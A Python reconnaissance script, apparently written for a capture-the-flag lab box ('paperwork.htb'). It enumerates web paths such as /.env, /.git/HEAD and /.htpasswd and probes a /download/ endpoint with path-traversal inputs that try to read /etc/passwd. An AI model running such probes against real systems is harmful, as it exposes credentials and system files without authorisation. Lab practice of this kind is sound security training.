import socket, time, urllib.request

target = '10.129.38.158'

# Probe nginx behavior: which paths return 404 instantly vs timeout vs other codes
print("=== Probing nginx path behavior ===", flush=True)

# Categorize paths that give different responses
test_paths = [
    # Static files
    '/index.html', '/style.css', '/script.js', '/favicon.ico',
    # Common dirs
    '/static/', '/assets/', '/css/', '/js/', '/img/', '/images/',
    # API/backend paths
    '/api/', '/api/v1/', '/api/archive', '/api/download',
    '/api/status', '/api/config', '/api/logs',
    # Admin
    '/admin/', '/admin', '/console', '/manage', '/management',
    # Special nginx paths
    '/nginx_status', '/server-status', '/health', '/healthcheck',
    # dotfiles
    '/.env', '/.git/HEAD', '/.htaccess', '/.htpasswd',
    # Server info
    '/phpinfo.php', '/info.php', '/test.php',
    # Proxy paths
    '/proxy/', '/cgi-bin/', '/fcgi-bin/',
    # Archive
    '/archive/', '/archive', '/spool/',
    # Common web apps
    '/wp-admin/', '/administrator/', '/joomla/',
]

for p in test_paths:
    try:
        req = urllib.request.Request(f'http://{target}{p}', headers={'Host': 'paperwork.htb'})
        resp = urllib.request.urlopen(req, timeout=4)
        body = resp.read().decode(errors='replace')[:100]
        if resp.status != 404:
            print(f'{p}: HTTP {resp.status} ({len(body)}b) {body[:60]}', flush=True)
    except urllib.error.HTTPError as e:
        if e.code != 404:
            print(f'{p}: HTTP {e.code}', flush=True)
    except Exception as e:
        print(f'{p}: TIMEOUT', flush=True)

print("", flush=True)
print("=== Probing /download/ endpoint ===", flush=True)
download_paths = [
    '/download/', '/download', '/download/archive',
    '/download/archive/', '/download/../', '/download/..',
    '/download/test', '/download/../../../etc/passwd',
]
for p in download_paths:
    try:
        req = urllib.request.Request(f'http://{target}{p}', headers={'Host': 'paperwork.htb'})
        resp = urllib.request.urlopen(req, timeout=4)
        body = resp.read().decode(errors='replace')[:200]
        print(f'{p}: HTTP {resp.status} ({len(body)}b) -> {body[:100]}', flush=True)
    except urllib.error.HTTPError as e:
        print(f'{p}: HTTP {e.code}', flush=True)
    except Exception as e:
        print(f'{p}: TIMEOUT', flush=True)
